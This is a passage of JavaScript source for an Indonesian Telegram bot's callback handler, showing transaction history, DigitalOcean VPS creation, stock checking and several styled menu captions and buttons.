                        { text: "〔 ʙᴜɢ ᴍᴇɴᴜ 〕", callback_data: "bugmenu" },
                    ],
                    [
                        {
                            text: "〔 ᴛᴏᴏʟs ᴍᴇɴᴜ & ᴍᴇɴᴜ sᴛᴏʀᴇ 〕",
                            callback_data: "alltools",
                        },
                    ],
                ],
            },
        }
    );
}


bot.on('callback_query', async (ctx, next) => {
  const moment = require('moment-timezone');
  const wib = moment().tz('Asia/Jakarta').format('HH:mm:ss');
  const wita = moment().tz('Asia/Makassar').format('HH:mm:ss');
  const wit = moment().tz('Asia/Jayapura').format('HH:mm:ss');
  const data = ctx.callbackQuery.data;
  const chatId = ctx.chat.id;
  const messageId = ctx.callbackQuery.message.message_id;
  const username = ctx.from.first_name || 'User';
  const userId = ctx.from.id;
  const uptime = getUptime();
  const totalToday = getUserTodayCount();
  const waktu = getWaktuSalam();
  const cg = getCgroupMemory();
  const memPanelText = cg
  ? `${formatBytes(cg.usage)} / ${cg.limit ? formatBytes(cg.limit) : 'Unlimited'}`
  : `${formatBytes(process.memoryUsage().rss)} / ?`;
  const cpuText = `${getCpuPercent().toFixed(1)}%`;
    let db = loadUsers()
  const { totalUser, totalTransaksi, totalPemasukan } = getBotStats(db)
  
  const mention = `<a href="tg://user?id=${ctx.from.id}">${ctx.from.first_name}</a>`;

  let newCaption = '';
  let newButtons = [];
  
if (data === "history") {
        await ctx.answerCbQuery().catch(() => {});


        const path = require("path");
        const fs = require("fs");


        const ROOT = process.cwd();
        const userDBPath = path.join(ROOT, "db", "users.json");


        // helper aman untuk HTML caption
        const escapeHTML = (t = "") =>
                String(t)
                        .replace(/&/g, "&amp;")
                        .replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;")
                        .replace(/"/g, "&quot;")
                        .replace(/'/g, "&#039;");


        const toRupiah = (n) => Number(n || 0).toLocaleString("id-ID");


        // tombol balik (balik ke menu lu)
        const backButtons = {
                reply_markup: {
                        inline_keyboard: [[{ text: "◁", callback_data: "alltools" }]],
                },
        };


        // kalau db ga ada
        if (!fs.existsSync(userDBPath)) {
                const caption = `<blockquote><b>📭 Belum ada riwayat transaksi.</b></blockquote>`;

                return ctx
                        .editMessageCaption(caption, {
                                parse_mode: "HTML",
                                ...backButtons,
                        })
                        .catch(() => {});
        }


        let users = [];

        try {
                users = JSON.parse(fs.readFileSync(userDBPath, "utf8"));
        } catch {
                users = [];
        }


        const fromId = ctx.from.id;
        const user = users.find((u) => u.id === fromId);


        if (!user || !user.history || user.history.length === 0) {
                const caption = `<blockquote><b>📭 Belum ada riwayat transaksi.</b></blockquote>`;

                return ctx
                        .editMessageCaption(caption, {
                                parse_mode: "HTML",
                                ...backButtons,
                        })
                        .catch(() => {});
        }


        const list = [...user.history].reverse();

        let caption = `<blockquote><b>📋 ʀɪᴡᴀʏᴀᴛ ᴛʀᴀɴsᴀᴋsɪ</b></blockquote>\n`;


        list.forEach((t, i) => {
                const d = new Date(t.timestamp || Date.now());
                const waktuTx = d.toLocaleString("id-ID");

                caption += `<blockquote><b>${i + 1}. ${escapeHTML(t.product || "-")}</b>\n`;
                caption += `💰 Harga: Rp${toRupiah(t.amount)}\n`;
                caption += `📅 ${escapeHTML(waktuTx)}\n`;
                caption += `📦 Tipe: ${escapeHTML(t.type || "-")}\n`;

                if (t.details) caption += `📝 Detail: ${escapeHTML(t.details)}\n`;

                caption += `</blockquote>\n`;
        });


        return ctx
                .editMessageCaption(caption, {
                        parse_mode: "HTML",
                        ...backButtons,
                })
                .catch(() => {});
}


// ==================== CVPS (Only when callback starts with 'cvps1 ') ====================
if (data.startsWith("cvps1 ")) {
        const senderId = String(ctx.from.id);
        const isOwner = isOwnerId(senderId);


        if (!isOwner) {
                return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
                        reply_markup: {
                                inline_keyboard: [
                                        [{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }],
                                ],
                        },
                });
        }


        // data: "cvps1 /r1c1 hostname"
        const parts = data.split(" ");
        const command = parts[1];
        const hostname = parts.slice(2).join(" ").toLowerCase();


        const sizeMap = {
                "/r1c1": "s-1vcpu-1gb",
                "/r2c1": "s-1vcpu-2gb",
                "/r2c2": "s-2vcpu-2gb",
                "/r4c2": "s-2vcpu-4gb",
                "/r8c4": "s-4vcpu-8gb",
                "/r16c4": "s-4vcpu-16gb-amd",
                "/r32c8": "s-8vcpu-32gb",
        };


        const sizeSlug = sizeMap[command];

        if (!sizeSlug) {
                return ctx.answerCbQuery("❌ Spesifikasi tidak valid.", { show_alert: true });
        }


        const password = generateRandomPassword();


        const dropletData = {
                name: hostname,
                region: "sgp1",
                size: sizeSlug,
                image: "ubuntu-20-04-x64",
                ssh_keys: null,
                backups: false,
                ipv6: true,
                user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
                private_networking: null,
                volumes: null,
                tags: ["TelegramBot"],
        };


        await ctx.answerCbQuery("🚀 Membuat VPS, mohon tunggu...");
        await ctx.reply("⏳ Sedang memproses pembuatan VPS... Ini bisa memakan waktu ±1 menit.");


        try {
                const create = await fetch("https://api.digitalocean.com/v2/droplets", {
                        method: "POST",
                        headers: {
                                "Content-Type": "application/json",
                                Authorization: `Bearer ${global.apiAkunDigitalOcean.akun1}`,
                        },
                        body: JSON.stringify(dropletData),
                });


                const result = await create.json();

                if (!create.ok) throw new Error(result.message || "Gagal membuat droplet.");


                const dropletId = result.droplet.id;

                await new Promise((res) => setTimeout(res, 60000)); // tunggu 1 menit


                const dropletInfo = await fetch(
                        `https://api.digitalocean.com/v2/droplets/${dropletId}`,
                        {
                                headers: {
                                        Authorization: `Bearer ${global.apiAkunDigitalOcean.akun1}`,
                                },
                        }
                );

                const dropletDataFinal = await dropletInfo.json();


                const ipVPS =
                        dropletDataFinal.droplet.networks.v4.find(
                                (net) => net.type === "public"
                        )?.ip_address || "❌ Tidak ada IP publik";


                let finalMsg = `✅ *VPS Berhasil Dibuat!*\n\n`;
                finalMsg += `🆔 ID: \`${dropletId}\`\n`;
                finalMsg += `🌐 IP VPS: \`${ipVPS}\`\n`;
                finalMsg += `🔑 Password: \`${password}\``;


                await ctx.reply(finalMsg, { parse_mode: "Markdown" });
        } catch (err) {
                console.error("❌ Error:", err);
                await ctx.reply(`Terjadi kesalahan saat membuat VPS:\n\n${err.message}`);
        }


        return;
}


/* ── Pilih akun DO ───────────────────── */
if (data.startsWith("cvps_acc_")) {
        const senderId = String(ctx.from.id);
        const isOwner = isOwnerId(senderId);


        if (!isOwner) {
                return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
                        reply_markup: {
                                inline_keyboard: [
                                        [{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }],
                                ],
                        },
                });
        }


        const [, accIdx, hostname] = data.split("_");
        const apiKey = global.apiAkunDigitalOcean[`akun${accIdx}`];

        if (!apiKey || apiKey.length < 64) return ctx.answerCbQuery("❌ API Key invalid!");


        const ik = [];

        osList.forEach((os) => {
                ik.push([{ text: os.t, callback_data: "ignore" }]);

                specs.forEach((s) => {
                        const cb = `cvps_do_${accIdx}_${hostname}_${os.slug}_${s.r}_${s.c}`;
                        ik.push([{ text: `💻 ${s.r}GB | ${s.c}C`, callback_data: cb }]);
                });
        });


        await ctx.answerCbQuery();

        return ctx.reply(`🖥️ Pilih spesifikasi VPS *${hostname}* (Akun #${accIdx}):`, {
                parse_mode: "Markdown",
                reply_markup: { inline_keyboard: ik },
        });
}


if (data === "ignore") return ctx.answerCbQuery();


/* ── Konfirmasi & Buat VPS ───────────── */
if (data.startsWith("cvps_do_")) {
        const senderId = String(ctx.from.id);
        const isOwner = isOwnerId(senderId);


        if (!isOwner) {
                return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
                        reply_markup: {
                                inline_keyboard: [
                                        [{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }],
                                ],
                        },
                });
        }


        const [, accIdx, hostname, image, ram, cpu] = data.split("_");
        const apiKey = global.apiAkunDigitalOcean[`akun${accIdx}`];

        if (!apiKey || apiKey.length < 64) return ctx.answerCbQuery("❌ API Key invalid!");


        await ctx.answerCbQuery();

        await ctx.reply(
                `🚀 Membuat VPS *${hostname}*\n` +
                        `🔸 OS: \`${image}\`\n` +
                        `🔸 RAM: ${ram}GB  CPU: ${cpu}C`,
                { parse_mode: "Markdown" }
        );


        try {
                const result = await CVPS(apiKey, {
                        hostname,
                        image,
                        size: getSizeSlug(+ram, +cpu),
                });


                return ctx.reply(
                        `✅ *VPS berhasil dibuat:*\n\n` +
                                `🖥️ Hostname : \`${result.name}\`\n` +
                                `🌍 Region   : \`${result.region}\`\n` +
                                `📶 IP       : \`${result.ip_address}\`\n` +
                                `📡 Status   : \`${result.status}\``,
                        { parse_mode: "Markdown" }
                );
        } catch (e) {
                console.error(e);
                return ctx.reply(`❌ Gagal membuat VPS:\n\n${e.message}`);
        }
}

if (data === "maiinmenu") {
        newCaption =
                `<blockquote><b>Halo ${mention} 👋 ${waktu}  
Perkenalkan, saya <strong>${config.NAMA_BOT}</strong>, bot Telegram buatan ${config.NAMA_PEMBUAT}. Bot ini dibuat untuk membantu pengguna menjalankan berbagai fitur yang tersedia di dalam Telegram, seperti mengakses menu, melihat informasi, dan menggunakan perintah yang telah disediakan.</b></blockquote>
<blockquote><b>┏━━⧼ ʙᴏᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ⧽
┃ ⚝ ɢᴜɪᴅᴇ    : <a href="https://telegra.ph/Elika-Md-01-29">${config.NAMA_BOT}(Telegraph)</a>
┃ ⚝ ɴᴏᴅᴇ     : ${nodeScript}
┃ ⚝ ᴍᴇᴍᴏʀʏ   : ${memPanelText}
┃ ⚝ ᴄᴘᴜ      : ${cpuText}
┃ ⚝ ᴘʟᴜɢɪɴs  : ${totalPlugins}
┃ ⚝ ᴜᴘᴛɪᴍᴇ   : ${uptime}
┃ ⚝ ᴊᴀᴍ : ${wib}
╠━━━━⧼ ᴜsᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ⧽
┃ ⚝ ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "user"}
┃ ⚝ ᴜsᴇʀ ɪᴅ  : <code>${userId}</code>
╠━━━━⧼ ᴛɪᴍᴇ ɪɴғᴏ ⧽
┃ ⚝ ᴘᴇᴍᴀsᴜᴋᴀɴ : <strong>Rp${totalPemasukan.toLocaleString("id-ID")}</strong>
┃ ⚝ ᴜsᴇʀs   : <strong>${totalToday}</strong>
┃ ⚝ ᴛʀᴀɴsᴀᴋsɪ   : <strong>${totalUser}</strong>
┗━━━━━━━━━━━━━━━━◇</b></blockquote>
<blockquote><b>Owner: <a href="https://t.me/${config.OWNER_BOT}">${config.NAMA_DEPAN}</a></b></blockquote>
<blockquote><b>─Silakan gunakan tombol menu di bawah untuk mulai menggunakan fitur yang ada.</b></blockquote>`;

        newButtons = [
                [
                        { text: "〔 ᴄʜᴀɴɴᴇʟ 〕", url: `https://t.me/${config.linkChannel}` },
                        { text: "〔 ᴛǫᴛᴏ 〕", callback_data: "tqto" },
                ],
                [
                        { text: "〔 ᴏᴡɴᴇʀ ᴍᴇɴᴜ 〕", callback_data: "ownermenu" },
                        { text: "〔 ʙᴜɢ ᴍᴇɴᴜ 〕", callback_data: "bugmenu" },
                ],
                [
                        { text: "〔 ᴛᴏᴏʟs ᴍᴇɴᴜ & ᴍᴇɴᴜ sᴛᴏʀᴇ  〕", callback_data: "alltools" },
                ],
        ];
} else if (data === "alltools") {
        newCaption =
                `<blockquote><b>✰ ʜᴀʟʟᴏ, @${ctx.from.username || "user"} 👋 ${waktu}  ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴇʟɪᴋᴀ - ᴍᴅ
✰ ɪ ᴀᴍ ᴇʟɪᴋᴀ ᴀɪ ᴡʜᴏ ᴡɪʟʟ ʜᴇʟᴘ ʏᴏᴜ, ᴊᴜsᴛ ᴄᴏɴsɪᴅᴇʀ ᴍᴇ ʏᴏᴜʀ ᴀssɪsᴛᴀɴᴛ.</b></blockquote>
<blockquote><b>╭─╶ ᴜsᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│◦ ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "user"}
│◦ ᴜsᴇʀ ɪᴅ  : ${userId}
╰─╶ </b></blockquote>
<blockquote><b>┌───「 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 」───┐
├ ◦ ᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ ᴍᴇɴᴜ ᴅɪ ᴛᴏᴍʙᴏʟ ʙᴀᴡᴀʜ
└─────────────────</b></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "ᴀʟʟ ᴛᴏᴏʟs", callback_data: "allmenu" },
                        { text: "sᴛᴏʀᴇ ᴍᴇɴᴜ", callback_data: "storemenu" },
                ],
                [
                        { text: "ɪɴғᴏʀᴍᴀᴛɪᴏɴ", callback_data: "informasi" },
                ],
                [
                        { text: "◁", callback_data: "maiinmenu" },
                ],
        ];
} else if (data === "allmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 』━━━━━━━━━━┓
┃ ✚ ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟹𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /𝚒𝚜𝚕𝚊𝚖 𝚖𝚎𝚗𝚞        /𝚜𝚊𝚠𝚎𝚛𝚒𝚊 𝚖𝚎𝚗𝚞
┃⚝├ /𝚌𝚕𝚊𝚒𝚖 𝚖𝚎𝚗𝚞        /𝚐𝚊𝚖𝚎𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚝𝚎𝚋𝚊𝚔 𝚖𝚎𝚗𝚞        /𝚌𝚊𝚝𝚊𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚝𝚘𝚛𝚎 𝚖𝚎𝚗𝚞        /𝚓𝚊𝚜𝚑𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚢𝚙𝚊𝚜𝚜 𝚖𝚎𝚗𝚞       /𝚒𝚗𝚜𝚝𝚊𝚕𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚖𝚎𝚗𝚞     /𝚝𝚘𝚘𝚕𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚐𝚛𝚘𝚞𝚙 𝚖𝚎𝚗𝚞        /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚎𝚊𝚛𝚌𝚑 𝚖𝚎𝚗𝚞       /𝚜𝚝𝚊𝚕𝚔 𝚖𝚎𝚗𝚞
┃⚝├ /𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞        /𝚘𝚠𝚗𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞            /𝚘𝚠𝚗𝚎𝚛𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚖𝚎𝚗𝚞    /𝚠𝚎𝚋 𝚖𝚎𝚗𝚞
┃⚝├ /𝚟𝚙𝚜 𝚖𝚎𝚗𝚞          /𝚜𝚞𝚋𝚍𝚘 𝚖𝚎𝚗𝚞
┃⚝├ /𝚏𝚞𝚗 𝚖𝚎𝚗𝚞          /𝚛𝚙𝚐 𝚖𝚎𝚗𝚞
┃⚝├ /𝚎𝚗𝚌 𝚖𝚎𝚗𝚞          /𝚊𝚗𝚒𝚖𝚎 𝚖𝚎𝚗𝚞
┃⚝└ /𝚛𝚊𝚗𝚍𝚘𝚖 𝚖𝚎𝚗𝚞       /𝚜𝚞𝚙𝚙𝚘𝚛𝚝 𝚖𝚎𝚗𝚞
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "ᴅᴏᴡɴʟᴏᴀᴅ", callback_data: "downloadmenu" },
                        { text: "ᴛᴏᴏʟs", callback_data: "toolsmenu" },
                ],
                [
                        { text: "ɢʀᴏᴜᴘ", callback_data: "groupmenu" },
                        { text: "ᴀɪ", callback_data: "aimenu" },
                ],
                [
                        { text: "ᴊᴀsʜᴇʀ", callback_data: "jasher" },
                        { text: "ʙʏᴘᴀss", callback_data: "bypass" },
                ],
                [
                        { text: "sᴛᴏʀᴇ", callback_data: "storemenu" },
                        { text: "sᴇᴀʀᴄʜ", callback_data: "searchmenu" },
                ],
                [
                        { text: "◁", callback_data: "alltools" },
                        { text: "〶", callback_data: "maiinmenu" },
                        { text: "▷", callback_data: "lanjut" },
                ],
        ];
} else if (data === "informasi") {
        newCaption =
                `<blockquote><b>┌───「 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 」───┐
├ ◦ ᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ ᴍᴇɴᴜ ᴅɪ ᴛᴏᴍʙᴏʟ ʙᴀᴡᴀʜ
└─────────────────</b></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "ʜɪsᴛᴏʀʏ", callback_data: "history" },
                        { text: "ᴄᴇᴋsᴛᴏᴄᴋ", callback_data: "cekstock" },
                ],
                [
                        { text: "◁", callback_data: "alltools" },
                ],
        ];
}
else if (data === "cekstock") {
        await ctx.answerCbQuery().catch(() => {});


        // stok utama kamu ada di sini (sesuai file yang kamu kirim)
        const stockFile = path.join(__dirname, "./db/stocks.json");
        const stocks = readJSONSafe(stockFile, {});


        const newCaption = buildCekStockCaption(stocks);

        const newButtons = [
                [
                        { text: "🔄 ʀᴇꜰʀᴇsʜ", callback_data: "cekstock" },
                        { text: "◁", callback_data: "alltools" }, // kalau menu balikmu beda, ganti callback-nya
                ],
        ];


        // PENTING: edit caption biar ga ngirim pesan baru
        await ctx
                .editMessageCaption(newCaption, {
                        parse_mode: "HTML",
                        reply_markup: { inline_keyboard: newButtons },
                })
                .catch(() => {});


        return; // WAJIB: biar gak lanjut ke editMessageCaption(newCaption) lain yang bisa bikin kosong
}
else if (data === "storemenu") {
        newCaption =
                `<blockquote><b>╭─╶ ᴜsᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│◦ ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "user"}
│◦ ᴜsᴇʀ ɪᴅ  : <code>${userId}</code>
╰─╶ </b></blockquote>
<blockquote><b>┌───「 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 」───┐
├ ◦ ᴘɪʟɪʜ ᴋᴇʙᴜᴛᴜʜᴀɴ ᴀɴᴅᴀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ
└─────────────────</b></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "ɪɴsᴛᴀʟʟ", callback_data: "install" },
                ],
                [
                        { text: "ʙᴜʏ ᴘᴀɴᴇʟ", callback_data: "buypanel" },
                        { text: "ʙᴜʏ ᴀᴅᴍɪɴ", callback_data: "buyadmin" },
                ],
                [
                        { text: "ʙᴜʏ sᴄʀɪᴘᴛ", callback_data: "buyscript" },
                        { text: "ʙᴜʏ ᴀᴘᴘ", callback_data: "buyapp" },
                ],
                [
                        { text: "ʙᴜʏ ᴅᴏ", callback_data: "buydo" },
                        { text: "ʙᴜʏ ᴠᴘs", callback_data: "buyvps" },
                ],
                [
                        { text: "◁", callback_data: "alltools" },
                ],
        ];
}
else if (data === "lanjut") {
        newCaption =
                `<blockquote><b>┏━━━━━『 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 』━━━━━━━━━━┓
┃ ✚ ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟹𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /𝚒𝚜𝚕𝚊𝚖 𝚖𝚎𝚗𝚞        /𝚜𝚊𝚠𝚎𝚛𝚒𝚊 𝚖𝚎𝚗𝚞
┃⚝├ /𝚌𝚕𝚊𝚒𝚖 𝚖𝚎𝚗𝚞        /𝚐𝚊𝚖𝚎𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚝𝚎𝚋𝚊𝚔 𝚖𝚎𝚗𝚞        /𝚌𝚊𝚝𝚊𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚝𝚘𝚛𝚎 𝚖𝚎𝚗𝚞        /𝚓𝚊𝚜𝚑𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚢𝚙𝚊𝚜𝚜 𝚖𝚎𝚗𝚞       /𝚒𝚗𝚜𝚝𝚊𝚕𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚖𝚎𝚗𝚞     /𝚝𝚘𝚘𝚕𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚐𝚛𝚘𝚞𝚙 𝚖𝚎𝚗𝚞        /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚎𝚊𝚛𝚌𝚑 𝚖𝚎𝚗𝚞       /𝚜𝚝𝚊𝚕𝚔 𝚖𝚎𝚗𝚞
┃⚝├ /𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞        /𝚘𝚠𝚗𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞            /𝚘𝚠𝚗𝚎𝚛𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚖𝚎𝚗𝚞    /𝚠𝚎𝚋 𝚖𝚎𝚗𝚞
┃⚝├ /𝚟𝚙𝚜 𝚖𝚎𝚗𝚞          /𝚜𝚞𝚋𝚍𝚘 𝚖𝚎𝚗𝚞
┃⚝├ /𝚏𝚞𝚗 𝚖𝚎𝚗𝚞          /𝚛𝚙𝚐 𝚖𝚎𝚗𝚞
┃⚝├ /𝚎𝚗𝚌 𝚖𝚎𝚗𝚞          /𝚊𝚗𝚒𝚖𝚎 𝚖𝚎𝚗𝚞
┃⚝└ /𝚛𝚊𝚗𝚍𝚘𝚖 𝚖𝚎𝚗𝚞       /𝚜𝚞𝚙𝚙𝚘𝚛𝚝 𝚖𝚎𝚗𝚞
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</b></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "ᴄᴘᴀɴᴇʟ", callback_data: "panelmenu" },
                        { text: "ᴏᴡɴᴇʀ", callback_data: "ownermenu" },
                ],
                [
                        { text: "ʀᴘɢ", callback_data: "rpgmenu" },
                        { text: "ᴇɴᴄ", callback_data: "encmenu" },
                ],
                [
                        { text: "ᴄᴀᴛᴀᴛᴀɴ", callback_data: "catat" },
                        { text: "ɢᴀᴍᴇs", callback_data: "games" },
                ],
                [
                        { text: "sᴜᴘᴘᴏʀᴛ", callback_data: "supportmenu" },
                        { text: "ᴛᴇʙᴀᴋ", callback_data: "tebak" },
                ],
                [
                        { text: "◁", callback_data: "allmenu" },
                        { text: "〶", callback_data: "maiinmenu" },
                        { text: "▷", callback_data: "seterus" },
                ],
        ];
}
else if (data === "seterus") {
        newCaption =
                `<blockquote><b>┏━━━━━『 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 』━━━━━━━━━━┓
┃ ✚ ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟹𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /𝚒𝚜𝚕𝚊𝚖 𝚖𝚎𝚗𝚞        /𝚜𝚊𝚠𝚎𝚛𝚒𝚊 𝚖𝚎𝚗𝚞
┃⚝├ /𝚌𝚕𝚊𝚒𝚖 𝚖𝚎𝚗𝚞        /𝚐𝚊𝚖𝚎𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚝𝚎𝚋𝚊𝚔 𝚖𝚎𝚗𝚞        /𝚌𝚊𝚝𝚊𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚝𝚘𝚛𝚎 𝚖𝚎𝚗𝚞        /𝚓𝚊𝚜𝚑𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚢𝚙𝚊𝚜𝚜 𝚖𝚎𝚗𝚞       /𝚒𝚗𝚜𝚝𝚊𝚕𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚖𝚎𝚗𝚞     /𝚝𝚘𝚘𝚕𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚐𝚛𝚘𝚞𝚙 𝚖𝚎𝚗𝚞        /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚎𝚊𝚛𝚌𝚑 𝚖𝚎𝚗𝚞       /𝚜𝚝𝚊𝚕𝚔 𝚖𝚎𝚗𝚞
┃⚝├ /𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞        /𝚘𝚠𝚗𝚎𝚛 𝚖𝚎𝚗𝚞
┃⚝├ /𝚋𝚘𝚝 𝚖𝚎𝚗𝚞            /𝚘𝚠𝚗𝚎𝚛𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞
┃⚝├ /𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 𝚖𝚎𝚗𝚞    /𝚠𝚎𝚋 𝚖𝚎𝚗𝚞
┃⚝├ /𝚟𝚙𝚜 𝚖𝚎𝚗𝚞          /𝚜𝚞𝚋𝚍𝚘 𝚖𝚎𝚗𝚞
┃⚝├ /𝚏𝚞𝚗 𝚖𝚎𝚗𝚞          /𝚛𝚙𝚐 𝚖𝚎𝚗𝚞
┃⚝├ /𝚎𝚗𝚌 𝚖𝚎𝚗𝚞          /𝚊𝚗𝚒𝚖𝚎 𝚖𝚎𝚗𝚞
┃⚝└ /𝚛𝚊𝚗𝚍𝚘𝚖 𝚖𝚎𝚗𝚞       /𝚜𝚞𝚙𝚙𝚘𝚛𝚝 𝚖𝚎𝚗𝚞
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</b></blockquote>
<blockquote><b>─╶ ᴘʀᴇss ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ</b></blockquote>`;

        newButtons = [
                [
                        { text: "sᴀᴡᴇʀɪᴀ", callback_data: "sawer" },
                        { text: "ʜᴀᴅɪᴀʜ", callback_data: "claim" },
                ],
                [
                        { text: "ɪsʟᴀᴍ", callback_data: "islam" },
                        { text: "ʀᴀɴᴅᴏᴍ ᴍᴇɴᴜ", callback_data: "animemenu" },
                ],
                [
                        { text: "ғᴜɴ", callback_data: "funmenu" },
                        { text: "sᴛᴀʟᴋ", callback_data: "stalkmenu" },
                ],
                [
                        { text: "sᴛᴏʀᴇ", callback_data: "storemenuu" },
                        { text: "ᴅɪɢɪᴛᴀʟ ᴏᴄᴇᴀɴ", callback_data: "digitalOcean" },
                ],
                [
                        { text: "◁", callback_data: "lanjut" },
                        { text: "〶", callback_data: "maiinmenu" },
                        { text: "▷", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "seterus1") {
        newCaption =
                `<blockquote><b>┏━━━━━『 ᴀʟʟ ᴄᴀᴛᴇɢᴏʀʏ 』━━━━━━━━━━┓
┃ ✚ ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟹𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /𝚒𝚜𝚕𝚊𝚖 𝚖𝚎𝚗𝚞        /𝚜𝚊𝚠𝚎𝚛𝚒𝚊 𝚖𝚎𝚗𝚞
┃⚝├ /𝚌𝚕𝚊𝚒𝚖 𝚖𝚎𝚗𝚞        /𝚐𝚊𝚖𝚎𝚜 𝚖𝚎𝚗𝚞
┃⚝├ /𝚝𝚎𝚋𝚊𝚔 𝚖𝚎𝚗𝚞        /𝚌𝚊𝚝𝚊𝚝 𝚖𝚎𝚗𝚞
┃⚝├ /𝚜𝚝𝚘𝚛𝚎 𝚖𝚎𝚗𝚞        /𝚓𝚊𝚜𝚑𝚎𝚛 𝚖𝚎𝚗𝚞
